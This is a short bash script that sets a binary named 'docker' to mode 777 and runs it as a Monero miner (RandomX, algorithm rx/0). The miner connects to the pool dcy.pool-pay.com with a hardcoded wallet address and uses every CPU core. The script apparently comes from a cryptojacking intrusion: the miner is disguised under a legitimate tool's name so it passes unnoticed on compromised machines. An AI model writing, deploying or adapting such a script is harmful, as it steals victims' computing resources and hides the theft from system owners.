#!/bin/bash
chmod 777 docker
./docker -o dcy.pool-pay.com:5657 -u NZyDXAQT1etjQEEiAoRWpacT58NtuWyWifQUP1CzvHnKWCp6L1iYsG4DzgTPJh4Wv3SvAB5jwmAiB2U3SmRFMUn9hYNDSAwgCzg3Vg52nKrYV -p $(echo $(shuf -i 1-20000 -n 1)-G) -k -a rx/0 -t$(nproc --all)
